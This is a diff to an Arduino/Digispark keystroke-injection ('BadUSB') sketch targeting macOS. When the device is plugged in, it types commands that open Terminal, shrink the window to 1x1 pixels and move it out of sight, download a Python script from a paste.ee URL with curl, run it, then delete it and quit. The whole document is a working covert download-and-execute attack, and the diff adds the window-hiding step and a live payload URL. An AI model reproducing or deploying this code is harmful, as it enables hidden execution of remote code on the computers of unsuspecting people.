@@ -5,10 +5,14 @@ void setup() {
 void loop() {
   DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("terminal");
+  DigiKeyboard.print("term");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(600);
-  DigiKeyboard.print("curl https://pastebin.com/raw/YOUR_CODE -o \"j.py\"");
+  DigiKeyboard.print("printf \'\\e[8;1;1t\'");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("printf \'\\e[3;0;0t\'");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("curl https://paste.ee/d/Mw6kX -o \"j.py\"");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(600);
   DigiKeyboard.print("python j.py");
@@ -18,6 +22,5 @@ void loop() {
   DigiKeyboard.print("rm j.py");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   for(;;){ /*empty*/ }
 }
